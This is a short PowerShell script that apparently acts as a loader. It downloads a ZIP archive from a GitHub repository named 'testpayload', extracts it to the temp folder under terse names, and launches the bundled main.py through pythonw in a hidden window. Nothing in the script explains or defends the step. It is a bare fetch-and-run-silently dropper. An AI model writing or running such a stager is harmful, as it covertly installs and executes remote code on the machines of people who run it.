$zipUrl = "https://github.com/SirPicklez/testpayload/archive/refs/heads/main.zip"
$tempDir = "$env:TEMP\b"
$zipPath = "$env:TEMP\a.zip"

# Create temp directory if not exists
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# Download ZIP
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

# Extract ZIP
Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force

# Run main.py silently
Start-Process -WindowStyle Hidden -FilePath "$tempDir\testpayload-main\python\pythonw.exe" -ArgumentList "$tempDir\testpayload-main\main.py"